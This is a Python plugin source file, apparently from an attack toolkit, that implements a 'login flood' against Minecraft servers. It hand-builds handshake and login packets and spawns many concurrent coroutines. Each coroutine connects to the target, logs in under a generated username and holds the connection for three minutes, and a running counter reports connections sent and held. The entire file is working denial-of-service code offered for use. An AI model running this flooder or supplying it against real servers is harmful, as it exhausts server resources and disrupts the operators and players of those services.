from plugins.common import *
import asyncio
import struct

def varint(value):
    buf = b''
    while True:
        part = value & 0x7F
        value >>= 7
        if value:
            part |= 0x80
        buf += bytes([part])
        if not value:
            return buf

def make_packet(data):
    return varint(len(data)) + data

def handshake_packet(host, port):
    data = (
        b'\x00' +
        varint(767) +
        varint(len(host)) + host.encode() +
        struct.pack('>H', int(port)) +
        varint(2)
    )
    return make_packet(data)

def login_packet(username):
    name = username.encode()
    data = b'\x00' + varint(len(name)) + name
    return make_packet(data)

async def worker(host, port, stop, count, holding):
    names = ['Alex','Sam','Jordan','Taylor','Morgan','Casey','Riley','Jamie','Drew','Quinn',
             'Blake','Casey','Dakota','Emery','Finley','Hayden','Hunter','Kendall','Logan','Quinn']
    i = 0
    while not stop.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=5
            )
            username = f"{names[i % len(names)]}{i}"

            writer.write(handshake_packet(host, port))
            writer.write(login_packet(username))
            await writer.drain()

            try:
                await asyncio.wait_for(reader.read(1024), timeout=0.1)
            except:
                pass

            count[0] += 1
            holding[0] += 1

            await asyncio.sleep(180)

            holding[0] -= 1
            writer.close()
            try:
                await writer.wait_closed()
            except:
                pass

            i += 1
        except:
            i += 1

async def _main(host, port, coroutines):
    stop = asyncio.Event()
    count = [0]
    holding = [0]

    tasks = [asyncio.create_task(worker(host, port, stop, count, holding)) for _ in range(coroutines)]

    async def stats():
        while not stop.is_set():
            await asyncio.sleep(1)
            logging.info(f'Total: {count[0]} | Holding: {holding[0]} | {host}:{port}')

    tasks.append(asyncio.create_task(stats()))

    try:
        await asyncio.gather(*tasks)
    except (asyncio.CancelledError, KeyboardInterrupt):
        stop.set()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

def logflood(server, coroutines):
    try:
        if ':' in server:
            host, port = server.split(':')
        else:
            host, port = server, '25565'

        port = int(port)
        coroutines = int(coroutines)

        logging.info(f'Starting login flood -> {host}:{port} | {coroutines} coroutines | Ctrl+C to stop')

        import warnings
        warnings.filterwarnings('ignore')

        try:
            asyncio.run(_main(host, port, coroutines))
        except KeyboardInterrupt:
            logging.success('Stopped')

    except Exception as e:
        logging.error(e)